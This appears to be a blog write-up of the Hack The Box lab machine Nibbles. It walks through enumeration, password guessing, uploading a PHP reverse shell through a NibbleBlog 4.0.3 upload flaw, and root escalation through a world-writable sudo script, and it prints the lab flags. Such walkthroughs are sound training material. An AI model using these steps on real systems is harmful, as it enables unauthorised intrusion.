<!doctype html> <head> <meta charset=utf-8> <meta name=viewport content="width=device-width,initial-scale=1"> <meta name=theme-color content=#333333> <base href=/Blog/ > <link href=global.css rel=stylesheet> <link href=fonts.css rel=stylesheet> <link href=highlight.css rel=stylesheet> <link href=manifest.json rel=manifest> <link href=as-logo2.ico rel=icon type=image/png> <link href=client/main.865564302.css rel=stylesheet> <noscript id=sapper-head-start></noscript><title>HTB - Nibbles</title><meta content=article property=og:type><meta content="HTB - Nibbles" property=og:title><meta name=Description content=""><meta content="" property=og:description><meta name=twitter:card content=summary_large_image><meta name=twitter:title value="HTB - Nibbles"><meta name=twitter:description content=""><meta name=twitter:label1 value="Published on"><meta name=twitter:data1 value="Apr 27, 2021"><meta name=twitter:label2 value="Reading Time"><meta name=twitter:data2 value="5 min read"><noscript id=sapper-head-end></noscript> </head> <body> <div id=sapper> <div class="svelte-v25qrq layout"> <header class=svelte-y9ah38> <a href=/ > <img alt=Sapper src=as-logo2.ico class=svelte-1u41owj> </a> <nav class=svelte-16qpxtx> <a href=. class=svelte-16qpxtx>Home</a> <a href=blog rel=prefetch class="svelte-16qpxtx selected">Blog</a> <a href=https://anu-bhav.github.io class=svelte-16qpxtx>Website</a> </nav> </header> <main class=svelte-v25qrq> <header class=svelte-ww3xvk> <p class=svelte-ww3xvk>April 27, 2021 ~ 5 min read</p> <h1 class=svelte-ww3xvk>HTB - Nibbles</h1> <a href=pdf/Nibbles.pdf target=_blank rel=nofollow class=svelte-ww3xvk id=pdf_link>View As PDF</a> <hr class=svelte-ww3xvk> </header> <div class=container> <article class=content> <h1 id=nibbles---10101075>Nibbles - 10.10.10.75</h1> <h1 id=enumeration>Enumeration</h1> <h2 id=nmap>Nmap</h2> <pre class=language-bash><code class=language-bash>nmap -sC -sV -oA nmap/initial 10.10.10.75</code></pre><pre class=language-bash><code class=language-bash>Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-26 21:14 EDT
Nmap scan report for 10.10.10.75
Host is up (0.24s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site does not have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.85 seconds</code></pre><h2 id=website>Website</h2> <pre class=language-bash><code class=language-bash>curl -svk "http://10.10.10.75" | grep . </code></pre><p>The command above is a quick way to see what is on the webpage without opening it in a browser. And it shows much more than what is displayed on the browser such as <strong>headers</strong> and <strong>html comments</strong>. The server header can be crossed check with the nmap results. The comment indicates that there is a directory named <strong>nibbleblog</strong> on the server.</p> <p><img alt="" src=Nibbles.assets/image-20210426221502521.png></p> <h2 id=gobuster>Gobuster</h2> <p>Enumerating the Apache webserver with gobuster.</p> <pre class=language-bash><code class=language-bash>gobuster dir -t 50 -w /usr/share/seclists/Discovery/Web-Content/common.txt -o log/gobuster.out -u http://10.10.10.75/nibbleblog</code></pre><pre class=language-bash><code class=language-bash>/.htpasswd            (Status: 403) [Size: 306]
/README               (Status: 200) [Size: 4628]
/admin                (Status: 301) [Size: 321] [--> http://10.10.10.75/nibbleblog/admin/]
/admin.php            (Status: 200) [Size: 1401]
/content              (Status: 301) [Size: 323] [--> http://10.10.10.75/nibbleblog/content/]
/index.php            (Status: 200) [Size: 2992]
/languages            (Status: 301) [Size: 325] [--> http://10.10.10.75/nibbleblog/languages/]
/plugins              (Status: 301) [Size: 323] [--> http://10.10.10.75/nibbleblog/plugins/]
/themes               (Status: 301) [Size: 322] [--> http://10.10.10.75/nibbleblog/themes/]</code></pre><pre class=language-bash><code class=language-bash>curl -sk "http://10.10.10.75/nibbleblog/README"</code></pre><p>Upon inspecting the <strong>README</strong> file, the <strong>version</strong>, <strong>release date</strong> and <strong>technologies</strong> used by the Content Management System (CMS) is discovered.</p> <p><img alt="" src=Nibbles.assets/image-20210426223306827.png></p> <pre class=language-bash><code class=language-bash>curl -sk "http://10.10.10.75/nibbleblog/content/"</code></pre><p>When viewing the content page, it has directory listing enable.</p> <p><img alt="" src=Nibbles.assets/image-20210426223956036.png></p> <p><img alt="" src=Nibbles.assets/image-20210426224823227.png></p> <p>On viewing the <a href=http://10.10.10.75/nibbleblog/content/private/users.xml target=_blank rel=nofollow>http://10.10.10.75/nibbleblog/content/private/users.xml</a> file, there is only one user, <strong>admin</strong>, and it appears to have an <strong>IP filtering blacklist</strong>.</p> <p><img alt="" src=Nibbles.assets/image-20210426225010279.png></p> <p>Since it is likely that the attacker gets blocked if they try a password bruteforce attack, the config file can be used as a hint for potential password. Also <strong>nibbleblog does not offer any default credentials</strong> that can be used.</p> <p>Potential password for user <strong>admin</strong>: </p> <ul> <li>admin</li> <li>nibbleblog</li> <li>nibbles</li> <li>yumyum</li> </ul> <p><img alt="" src=Nibbles.assets/image-20210426225731825.png></p> <p>Bad login attempts are recorded with the attacker's IP.</p> <p><img alt="" src=Nibbles.assets/image-20210426230421923.png></p> <p>The attacker can successfully login using the credentials <strong><code>admin:nibbles</code></strong>.</p> <p><img alt="" src=Nibbles.assets/image-20210426230436563.png></p> <h2 id=searchsploit>Searchsploit</h2> <p>Searchsploit is used to search for a known exploit for: <strong>nibbleblog</strong></p> <pre class=language-bash><code class=language-bash>searchsploit nibbleblog</code></pre><p><img alt="" src=Nibbles.assets/image-20210426230732546.png></p> <p>A metasploit exploit can be found for this exact nibbleblog version.</p> <h1 id=exploitation>Exploitation</h1> <h3 id=vulnerability-explanation><strong>Vulnerability Explanation:</strong></h3> <p>When uploading image files via the "My image" plugin - which is delivered with NibbleBlog by default - , NibbleBlog 4.0.3 keeps the original extension of uploaded files. This extension or the actual file type are not checked, thus it is possible to upload PHP files and gain code execution. </p> <p>source: <a href=https://packetstormsecurity.com/files/133425/NibbleBlog-4.0.3-Shell-Upload.html target=_blank rel=nofollow>https://packetstormsecurity.com/files/133425/NibbleBlog-4.0.3-Shell-Upload.html</a></p> <h3 id=proof-of-concept>Proof Of Concept</h3> <p>The metasploit exploit can be easily replicated manually without using metasploit.</p> <p>A simple php script is created. When testing exploits, it is highly recommended to keep the proof of concept as simple as possible as it is less likely to be blocked. </p> <p>Example: <code>echo</code> is less likely to be blocked compared to <code>exec</code> or <code>system</code>. </p> <pre class=language-php><code class=language-php><span class="prolog token">&lt;?php 
    echo "test test test";
?></span></code></pre><p>Upload URL: <a href="http://10.10.10.75/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image" target=_blank rel=nofollow>http://10.10.10.75/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image</a></p> <p>RCE URL: <a href=http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php target=_blank rel=nofollow>http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php</a></p> <p><img alt="" src=Nibbles.assets/image-20210426235230027.png></p> <p><img alt="" src=Nibbles.assets/image-20210426235348283.png></p> <h3 id=getting-a-reverse-shell>Getting a reverse shell</h3> <p>On kali linux, these are some default location where php reverse shells can be found.</p> <pre class=language-bash><code class=language-bash>$ locate php-reverse                                                                             
/usr/share/laudanum/php/php-reverse-shell.php
/usr/share/laudanum/wordpress/templates/php-reverse-shell.php
/usr/share/seclists/Web-Shells/laudanum-0.8/php/php-reverse-shell.php
/usr/share/webshells/php/php-reverse-shell.php</code></pre><pre class=language-bash><code class=language-bash>cp /usr/share/laudanum/php/php-reverse-shell.php shell.php</code></pre><p>Editing the php reverse shell to connect to the attacker's IP address.</p> <p><img alt="" src=Nibbles.assets/image-20210427000705549.png></p> <p>The attacker then uploads the shell.php and sets up <strong>nc</strong> to listen for an incoming connection on port <strong>8888</strong>.</p> <p><img alt="" src=Nibbles.assets/image-20210427000953310.png></p> <p>The reverse shell is then stabilised using the following commands.</p> <pre class=language-bash><code class=language-bash>which python3 # to know which python version exists
python3 -c 'import pty;pty.spawn("/bin/bash")' # gets a proper tty shell
# the shell is then backgrounded using ctrl+z
stty raw -echo # this is executed on the attackers machine
# then press fg to resume the tty shell
export TERM=xterm # after setting the terminal type, the screen can now be cleared
stty rows 42 cols 172 # sets the size for the tty shell</code></pre><p><img alt="" src=Nibbles.assets/image-20210427001449345.png></p> <h3 id=usertxt>User.txt</h3> <pre class=language-bash><code class=language-bash>find /home -type f -ls 2>/dev/null</code></pre><p>The above command finds everything having the type <strong>file</strong> in the directory <strong>/home</strong>, as well as listing all the attributes of each file and finally <strong>2>/dev/null</strong> is used to redirect <strong>standard error</strong> to <strong>/dev/null</strong>.</p> <p><img alt="" src=Nibbles.assets/image-20210427002323525.png></p> <p><strong>User.txt</strong> can be found in the home directory of <strong>nibbler</strong>.</p> <pre class=language-bash><code class=language-bash>cat /home/nibbler/user.txt</code></pre><p><img alt="" src=Nibbles.assets/image-20210427002522089.png></p> <blockquote> <p>user.txt flag: <code>41c963a4678306c21c790c4bb0dff71d</code></p> </blockquote> <h1 id=post-exploitation>Post Exploitation</h1> <h2 id=privilege-escalation-to-root>Privilege Escalation to Root</h2> <p>As can be seen below, the user <strong>nibbler</strong> can execute the file <strong>/home/nibbler/personal/stuff/monitor.sh</strong> <em>without the need of a password</em>.</p> <pre class=language-bash><code class=language-bash>sudo -l
...[snip]...
User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh</code></pre><pre class=language-bash><code class=language-bash>unzip personal.zip
ls -la personal/stuff/monitor.sh
-rwxrwxrwx 1 nibbler nibbler 4015 May  8  2015 personal/stuff/monitor.sh</code></pre><p><img alt="" src=Nibbles.assets/image-20210427004215618.png></p> <h3 id=vulnerability-explanation-1><strong>Vulnerability Explanation:</strong></h3> <p>The file <strong>/home/nibbler/personal/stuff/monitor.sh</strong> is world-writable. The content of the file can be modified to drop a shell. When running the file as root, the attacker will be get a root shell.</p> <pre class=language-bash><code class=language-bash># line in added at the top of the script, just after the shebang line.
/bin/bash -p </code></pre><p><img alt="" src=Nibbles.assets/image-20210427004934185.png> </p> <p><img alt="" src=Nibbles.assets/image-20210427005056993.png></p> <h3 id=roottxt>Root.txt</h3> <p>the <strong>root.txt</strong> file is always located in <strong>/root/</strong></p> <pre class=language-bash><code class=language-bash>cat /root/root.txt</code></pre><p><img alt="" src=Nibbles.assets/image-20210427005421970.png></p> <blockquote> <p>root.txt flag: <code>d9ae263a345701460f51766ae70e5e26</code></p> </blockquote> </article> <hr> <button class="back-to-top hidden svelte-h76b9j"> <svg aria-hidden=true class="" id="" role=img style=height:1em;line-height:.75em;font-size:1.33333em;vertical-align:-.225em;overflow:visible viewBox="0 0 448 512" xmlns=http://www.w3.org/2000/svg> <g transform="translate(256 256)"> <g transform=""> <path d="M34.9 289.5l-22.2-22.2c-9.4-9.4-9.4-24.6 0-33.9L207 39c9.4-9.4 24.6-9.4 33.9 0l194.3 194.3c9.4 9.4 9.4 24.6 0 33.9L413 289.4c-9.5 9.5-25 9.3-34.3-.4L264 168.6V456c0 13.3-10.7 24-24 24h-32c-13.3 0-24-10.7-24-24V168.6L69.2 289.1c-9.3 9.8-24.8 10-34.3.4z" fill=currentColor transform="translate(-256 -256)"></path> </g> </g> </svg> </button> <div class=svelte-1b2y202> <img alt="Anubhavsingh Sawdagur" src=profile-pic.png class=svelte-1b2y202> <p class=svelte-1b2y202> Hi, I'm <strong class=highlight>Anubhav</strong>. I'm an Ethical Hacker, Software Engineer and Network Engineer from Mauritius. <br> You can find me on <a href=https://www.instagram.com/_anu_bhav_/ target=_blank>Instagram</a>, <a href=https://www.twitter.com/0_Pr0t0typ3/ target=_blank>Twitter</a>, <a href=https://www.facebook.com/anubhav.s.0809/ target=_blank>Facebook</a> or <a href=https://www.linkedin.com/in/anubhavsingh-sawdagur/ target=_blank>LinkedIn</a>. See more of my work on <a href="https://github.com/Anu-bhav?tab=repositories" target=_blank>GitHub</a> or read about me on my <a href=https://anu-bhav.github.io/ target=_blank>Website</a> </p> </div> </div> </main> <footer class=svelte-v25qrq> <span> © 2021 Personal Blog. Powered by <a href=https://sapper.svelte.dev target=_blank>Sapper</a>. Template by <a href=https://anu-bhav.github.io target=_blank>Anubhavsingh Sawdagur</a>. </span> </footer> </div></div> <script>__SAPPER__={baseUrl:"/Blog",preloaded:[void 0,null,{pdf_location:"pdf\u002FNibbles.pdf",has_pdf:true,post:{title:"HTB - Nibbles",slug:"Nibbles",html:"\u003Ch1 id=\"nibbles---10101075\"\u003ENibbles - 10.10.10.75\u003C\u002Fh1\u003E\n\u003Ch1 id=\"enumeration\"\u003EEnumeration\u003C\u002Fh1\u003E\n\u003Ch2 id=\"nmap\"\u003ENmap\u003C\u002Fh2\u003E\n\u003Cpre class=\"language-bash\"\u003E\u003Ccode class=\"language-bash\"\u003Enmap -sC -sV -oA nmap\u002Finitial 10.10.10.75\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cpre class=\"language-bash\"\u003E\u003Ccode class=\"language-bash\"\u003EStarting Nmap 7.91 ( https:\u002F\u002Fnmap.org ) at 2021-04-26 21:14 EDT\nNmap scan report for 10.10.10.75\nHost is up (0.24s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE VERSION\n22\u002Ftcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)\n|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)\n|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)\n80\u002Ftcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-server-header: Apache\u002F2.4.18 (Ubuntu)\n|_http-title: Site does not have a title (text\u002Fhtml).\nService Info: OS: Linux; CPE: cpe:\u002Fo:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https:\u002F\u002Fnmap.org\u002Fsubmit\u002F .\nNmap done: 1 IP address (1 host up) scanned in 39.85 seconds\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch2 id=\"website\"\u003EWebsite\u003C\u002Fh2\u003E\n\u003Cpre class=\"language-bash\"\u003E\u003Ccode class=\"language-bash\"\u003Ecurl -svk \"http:\u002F\u002F10.10.10.75\" | grep . \u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003EThe command above is a quick way to see what is on the webpage without opening it in a browser. And it shows much more than what is displayed on the browser such as \u003Cstrong\u003Eheaders\u003C\u002Fstrong\u003E and \u003Cstrong\u003Ehtml comments\u003C\u002Fstrong\u003E. The server header can be crossed check with the nmap results. The comment indicates that there is a directory named \u003Cstrong\u003Enibbleblog\u003C\u002Fstrong\u003E on the server.\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"Nibbles.assets\u002Fimage-20210426221502521.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Ch2 id=\"gobuster\"\u003EGobuster\u003C\u002Fh2\u003E\n\u003Cp\u003EEnumerating the Apache webserver with gobuster.\u003C\u002Fp\u003E\n\u003Cpre class=\"language-bash\"\u003E\u003Ccode class=\"language-bash\"\u003Egobuster dir -t 50 -w \u002Fusr\u002Fshare\u002Fseclists\u002FDiscovery\u002FWeb-Content\u002Fcommon.txt -o log\u002Fgobuster.out -u http:\u002F\u002F10.10.10.75\u002Fnibbleblog\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cpre class=\"language-bash\"\u003E\u003Ccode class=\"language-bash\"\u003E\u002F.htpasswd            (Status: 403) [Size: 306]\n\u002FREADME               (Status: 200) [Size: 4628]\n\u002Fadmin                (Status: 301) [Size: 321] [--\u003E http:\u002F\u002F10.10.10.75\u002Fnibbleblog\u002Fadmin\u002F]\n\u002Fadmin.php            (Status: 200) [Size: 1401]\n\u002Fcontent              (Status: 301) [Size: 323] [--\u003E http:\u002F\u002F10.10.10.75\u002Fnibbleblog\u002Fcontent\u002F]\n\u002Findex.php            (Status: 200) [Size: 2992]\n\u002Flanguages            (Status: 301) [Size: 325] [--\u003E http:\u002F\u002F10.10.10.75\u002Fnibbleblog\u002Flanguages\u002F]\n\u002Fplugins              (Status: 301) [Size: 323] [--\u003E http:\u002F\u002F10.10.10.75\u002Fnibbleblog\u002Fplugins\u002F]\n\u002Fthemes               (Status: 301) [Size: 322] [--\u003E http:\u002F\u002F10.10.10.75\u002Fnibbleblog\u002Fthemes\u002F]\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cpre class=\"language-bash\"\u003E\u003Ccode class=\"language-bash\"\u003Ecurl -sk \"http:\u002F\u002F10.10.10.75\u002Fnibbleblog\u002FREADME\"\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003EUpon inspecting the \u003Cstrong\u003EREADME\u003C\u002Fstrong\u003E file, the \u003Cstrong\u003Eversion\u003C\u002Fstrong\u003E, \u003Cstrong\u003Erelease date\u003C\u002Fstrong\u003E and \u003Cstrong\u003Etechnologies\u003C\u002Fstrong\u003E used by the Content Management System (CMS) is discovered.\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"Nibbles.assets\u002Fimage-20210426223306827.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cpre class=\"language-bash\"\u003E\u003Ccode class=\"language-bash\"\u003Ecurl -sk \"http:\u002F\u002F10.10.10.75\u002Fnibbleblog\u002Fcontent\u002F\"\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003EWhen viewing the content page, it has directory listing enable.\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"Nibbles.assets\u002Fimage-20210426223956036.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"Nibbles.assets\u002Fimage-20210426224823227.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003EOn viewing the \u003Ca target=\"_blank\" rel=\"nofollow\" href=\"http:\u002F\u002F10.10.10.75\u002Fnibbleblog\u002Fcontent\u002Fprivate\u002Fusers.xml\"\u003Ehttp:\u002F\u002F10.10.10.75\u002Fnibbleblog\u002Fcontent\u002Fprivate\u002Fusers.xml\u003C\u002Fa\u003E file, there is only one user, \u003Cstrong\u003Eadmin\u003C\u002Fstrong\u003E, and it appears to have an \u003Cstrong\u003EIP filtering blacklist\u003C\u002Fstrong\u003E.\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"Nibbles.assets\u002Fimage-20210426225010279.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003ESince it is likely that the attacker gets blocked if they try a password bruteforce attack, the config file can be used as a hint for potential password. Also \u003Cstrong\u003Enibbleblog does not offer any default credentials\u003C\u002Fstrong\u003E that can be used.\u003C\u002Fp\u003E\n\u003Cp\u003EPotential password for user \u003Cstrong\u003Eadmin\u003C\u002Fstrong\u003E: \u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003Eadmin\u003C\u002Fli\u003E\n\u003Cli\u003Enibbleblog\u003C\u002Fli\u003E\n\u003Cli\u003Enibbles\u003C\u002Fli\u003E\n\u003Cli\u003Eyumyum\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Cp\u003E\u003Cimg src=\"Nibbles.assets\u002Fimage-20210426225731825.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003EBad login attempts are recorded with the attacker&#39;s IP.\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"Nibbles.assets\u002Fimage-20210426230421923.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003EThe attacker can successfully login using the credentials \u003Cstrong\u003E\u003Ccode\u003Eadmin:nibbles\u003C\u002Fcode\u003E\u003C\u002Fstrong\u003E.\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"Nibbles.assets\u002Fimage-20210426230436563.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Ch2 id=\"searchsploit\"\u003ESearchsploit\u003C\u002Fh2\u003E\n\u003Cp\u003ESearchsploit is used to search for a known exploit for: \u003Cstrong\u003Enibbleblog\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\n\u003Cpre class=\"language-bash\"\u003E\u003Ccode class=\"language-bash\"\u003Esearchsploit nibbleblog\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003E\u003Cimg src=\"Nibbles.assets\u002Fimage-20210426230732546.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003EA metasploit exploit can be found for this exact nibbleblog version.\u003C\u002Fp\u003E\n\u003Ch1 id=\"exploitation\"\u003EExploitation\u003C\u002Fh1\u003E\n\u003Ch3 id=\"vulnerability-explanation\"\u003E\u003Cstrong\u003EVulnerability Explanation:\u003C\u002Fstrong\u003E\u003C\u002Fh3\u003E\n\u003Cp\u003EWhen uploading image files via the &quot;My image&quot; plugin - which is delivered with NibbleBlog by default - , NibbleBlog 4.0.3 keeps the original extension of uploaded files. This extension or the actual file type are not checked, thus it is possible to upload PHP files and gain code execution. \u003C\u002Fp\u003E\n\u003Cp\u003Esource: \u003Ca target=\"_blank\" rel=\"nofollow\" href=\"https:\u002F\u002Fpacketstormsecurity.com\u002Ffiles\u002F133425\u002FNibbleBlog-4.0.3-Shell-Upload.html\"\u003Ehttps:\u002F\u002Fpacketstormsecurity.com\u002Ffiles\u002F133425\u002FNibbleBlog-4.0.3-Shell-Upload.html\u003C\u002Fa\u003E\u003C\u002Fp\u003E\n\u003Ch3 id=\"proof-of-concept\"\u003EProof Of Concept\u003C\u002Fh3\u003E\n\u003Cp\u003EThe metasploit exploit can be easily replicated manually without using metasploit.\u003C\u002Fp\u003E\n\u003Cp\u003EA simple php script is created. When testing exploits, it is highly recommended to keep the proof of concept as simple as possible as it is less likely to be blocked. \u003C\u002Fp\u003E\n\u003Cp\u003EExample: \u003Ccode\u003Eecho\u003C\u002Fcode\u003E is less likely to be blocked compared to \u003Ccode\u003Eexec\u003C\u002Fcode\u003E or \u003Ccode\u003Esystem\u003C\u002Fcode\u003E. \u003C\u002Fp\u003E\n\u003Cpre class=\"language-php\"\u003E\u003Ccode class=\"language-php\"\u003E\u003Cspan class=\"token prolog\"\u003E&lt;?php \n    echo \"test test test\";\n?\u003E\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003EUpload URL: \u003Ca target=\"_blank\" rel=\"nofollow\" href=\"http:\u002F\u002F10.10.10.75\u002Fnibbleblog\u002Fadmin.php?controller=plugins&amp;action=config&amp;plugin=my_image\"\u003Ehttp:\u002F\u002F10.10.10.75\u002Fnibbleblog\u002Fadmin.php?controller=plugins&amp;action=config&amp;plugin=my_image\u003C\u002Fa\u003E\u003C\u002Fp\u003E\n\u003Cp\u003ERCE URL: \u003Ca target=\"_blank\" rel=\"nofollow\" href=\"http:\u002F\u002F10.10.10.75\u002Fnibbleblog\u002Fcontent\u002Fprivate\u002Fplugins\u002Fmy_image\u002Fimage.php\"\u003Ehttp:\u002F\u002F10.10.10.75\u002Fnibbleblog\u002Fcontent\u002Fprivate\u002Fplugins\u002Fmy_image\u002Fimage.php\u003C\u002Fa\u003E\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"Nibbles.assets\u002Fimage-20210426235230027.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"Nibbles.assets\u002Fimage-20210426235348283.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Ch3 id=\"getting-a-reverse-shell\"\u003EGetting a reverse shell\u003C\u002Fh3\u003E\n\u003Cp\u003EOn kali linux, these are some default location where php reverse shells can be found.\u003C\u002Fp\u003E\n\u003Cpre class=\"language-bash\"\u003E\u003Ccode class=\"language-bash\"\u003E$ locate php-reverse                                                                             \n\u002Fusr\u002Fshare\u002Flaudanum\u002Fphp\u002Fphp-reverse-shell.php\n\u002Fusr\u002Fshare\u002Flaudanum\u002Fwordpress\u002Ftemplates\u002Fphp-reverse-shell.php\n\u002Fusr\u002Fshare\u002Fseclists\u002FWeb-Shells\u002Flaudanum-0.8\u002Fphp\u002Fphp-reverse-shell.php\n\u002Fusr\u002Fshare\u002Fwebshells\u002Fphp\u002Fphp-reverse-shell.php\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cpre class=\"language-bash\"\u003E\u003Ccode class=\"language-bash\"\u003Ecp \u002Fusr\u002Fshare\u002Flaudanum\u002Fphp\u002Fphp-reverse-shell.php shell.php\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003EEditing the php reverse shell to connect to the attacker&#39;s IP address.\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"Nibbles.assets\u002Fimage-20210427000705549.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003EThe attacker then uploads the shell.php and sets up \u003Cstrong\u003Enc\u003C\u002Fstrong\u003E to listen for an incoming connection on port \u003Cstrong\u003E8888\u003C\u002Fstrong\u003E.\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"Nibbles.assets\u002Fimage-20210427000953310.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003EThe reverse shell is then stabilised using the following commands.\u003C\u002Fp\u003E\n\u003Cpre class=\"language-bash\"\u003E\u003Ccode class=\"language-bash\"\u003Ewhich python3 # to know which python version exists\npython3 -c 'import pty;pty.spawn(\"\u002Fbin\u002Fbash\")' # gets a proper tty shell\n# the shell is then backgrounded using ctrl+z\nstty raw -echo # this is executed on the attackers machine\n# then press fg to resume the tty shell\nexport TERM=xterm # after setting the terminal type, the screen can now be cleared\nstty rows 42 cols 172 # sets the size for the tty shell\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003E\u003Cimg src=\"Nibbles.assets\u002Fimage-20210427001449345.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Ch3 id=\"usertxt\"\u003EUser.txt\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-bash\"\u003E\u003Ccode class=\"language-bash\"\u003Efind \u002Fhome -type f -ls 2\u003E\u002Fdev\u002Fnull\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003EThe above command finds everything having the type \u003Cstrong\u003Efile\u003C\u002Fstrong\u003E in the directory \u003Cstrong\u003E\u002Fhome\u003C\u002Fstrong\u003E, as well as listing all the attributes of each file and finally \u003Cstrong\u003E2&gt;\u002Fdev\u002Fnull\u003C\u002Fstrong\u003E is used to redirect \u003Cstrong\u003Estandard error\u003C\u002Fstrong\u003E to \u003Cstrong\u003E\u002Fdev\u002Fnull\u003C\u002Fstrong\u003E.\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"Nibbles.assets\u002Fimage-20210427002323525.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cstrong\u003EUser.txt\u003C\u002Fstrong\u003E can be found in the home directory of \u003Cstrong\u003Enibbler\u003C\u002Fstrong\u003E.\u003C\u002Fp\u003E\n\u003Cpre class=\"language-bash\"\u003E\u003Ccode class=\"language-bash\"\u003Ecat \u002Fhome\u002Fnibbler\u002Fuser.txt\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003E\u003Cimg src=\"Nibbles.assets\u002Fimage-20210427002522089.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cblockquote\u003E\n\u003Cp\u003Euser.txt flag: \u003Ccode\u003E41c963a4678306c21c790c4bb0dff71d\u003C\u002Fcode\u003E\u003C\u002Fp\u003E\n\u003C\u002Fblockquote\u003E\n\u003Ch1 id=\"post-exploitation\"\u003EPost Exploitation\u003C\u002Fh1\u003E\n\u003Ch2 id=\"privilege-escalation-to-root\"\u003EPrivilege Escalation to Root\u003C\u002Fh2\u003E\n\u003Cp\u003EAs can be seen below, the user \u003Cstrong\u003Enibbler\u003C\u002Fstrong\u003E can execute the file \u003Cstrong\u003E\u002Fhome\u002Fnibbler\u002Fpersonal\u002Fstuff\u002Fmonitor.sh\u003C\u002Fstrong\u003E \u003Cem\u003Ewithout the need of a password\u003C\u002Fem\u003E.\u003C\u002Fp\u003E\n\u003Cpre class=\"language-bash\"\u003E\u003Ccode class=\"language-bash\"\u003Esudo -l\n...[snip]...\nUser nibbler may run the following commands on Nibbles:\n    (root) NOPASSWD: \u002Fhome\u002Fnibbler\u002Fpersonal\u002Fstuff\u002Fmonitor.sh\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cpre class=\"language-bash\"\u003E\u003Ccode class=\"language-bash\"\u003Eunzip personal.zip\nls -la personal\u002Fstuff\u002Fmonitor.sh\n-rwxrwxrwx 1 nibbler nibbler 4015 May  8  2015 personal\u002Fstuff\u002Fmonitor.sh\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003E\u003Cimg src=\"Nibbles.assets\u002Fimage-20210427004215618.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Ch3 